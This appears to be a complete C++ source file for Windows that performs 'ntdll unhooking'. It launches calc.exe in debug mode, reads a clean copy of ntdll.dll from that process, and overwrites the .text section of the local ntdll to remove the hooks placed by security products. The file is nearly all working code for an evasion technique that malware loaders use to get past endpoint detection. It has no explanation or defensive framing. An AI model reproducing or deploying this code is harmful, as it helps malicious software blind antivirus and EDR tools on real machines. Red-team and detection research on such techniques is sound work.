#include <windows.h>
#include <algorithm>
#include <string>
#include <winternl.h>
#include <iostream>

SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return pImgNtHdrs->OptionalHeader.SizeOfImage;
}

PVOID FetchLocalNtdllBaseAddress() {
	PTEB teb = static_cast<PTEB>(NtCurrentTeb());
	PPEB peb = teb->ProcessEnvironmentBlock;
	PLIST_ENTRY listHead = &peb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY listEntry = listHead->Flink;

	ULONG addr = 0X0;
	while (listEntry != listHead)
	{
		PLDR_DATA_TABLE_ENTRY ldrEntry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		std::wstring dllName = ldrEntry->FullDllName.Buffer;
		std::transform(dllName.begin(), dllName.end(), dllName.begin(), ::tolower);

		if (dllName.find(L"c:\\windows\\system32\\ntdll.dll") != std::wstring::npos) {
			return ldrEntry->DllBase;
		}

		listEntry = listEntry->Flink;
	}
	return (PVOID)addr;
}

BOOL ReadNtdllFromASuspendedProcess(IN LPCSTR lpProcessName, OUT PVOID* ppNtdllBuf) {

	CHAR	cWinPath[MAX_PATH / 2] = { 0 };
	CHAR	cProcessPath[MAX_PATH] = { 0 };

	PVOID	pNtdllModule = FetchLocalNtdllBaseAddress();
	PBYTE	pNtdllBuffer = NULL;
	SIZE_T	sNtdllSize = NULL,
		sNumberOfBytesRead = NULL;

	STARTUPINFOA                    Si = { 0 };
	PROCESS_INFORMATION            Pi = { 0 };

	
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));


	Si.cb = sizeof(STARTUPINFO);

	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	sprintf_s(cProcessPath, sizeof(cProcessPath), "%s\\System32\\%s", cWinPath, lpProcessName);

	if (!CreateProcessA(
		NULL,
		cProcessPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}


	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
	if (!sNtdllSize)
		goto _EndOfFunc;
	pNtdllBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
	if (!pNtdllBuffer)
		goto _EndOfFunc;

	if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
		printf("[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllSize);
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

	if (DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi.hProcess, 0)) {
		// terminating
	}


_EndOfFunc:
	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);
	if (Pi.hThread)
		CloseHandle(Pi.hThread);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;

}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID               pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();


	PIMAGE_DOS_HEADER   pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;


	PIMAGE_NT_HEADERS   pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt = NULL,
		pRemoteNtdllTxt = NULL; 
	SIZE_T		sNtdllTxtSize = NULL;	


	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		//  if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;


	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main() {
	LPCSTR ProcName = (LPCSTR)"calc.exe";
	PVOID ntdllbuf = NULL;
	if (ReadNtdllFromASuspendedProcess(ProcName, &ntdllbuf)) {
		if (ReplaceNtdllTxtSection(ntdllbuf)) {
			std::cout << "Success" << std::endl;
		}
	}

	return 0;
}